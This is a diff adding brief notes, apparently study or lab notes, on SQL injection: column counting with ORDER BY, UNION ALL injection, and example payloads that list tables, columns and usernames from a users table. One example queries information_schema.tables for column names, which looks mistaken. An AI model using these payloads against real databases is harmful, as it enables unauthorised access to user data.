@@ -1,0 +1,14 @@
+Column enumeration
+
+`1 ORDER BY X` where X is the column number 
+
+Enumeration through query
+
+`1 union all <query>`
+
+Note that the query will need to result in the same number of columns to avoid errors.
+
+`<query>` could be:
+- `select 1, table_name from information_schema.tables` (this is MariaDB specific)
+- `select 1, column_name from information_schema.tables where table_name='users'`
+- `select 1, username from users`
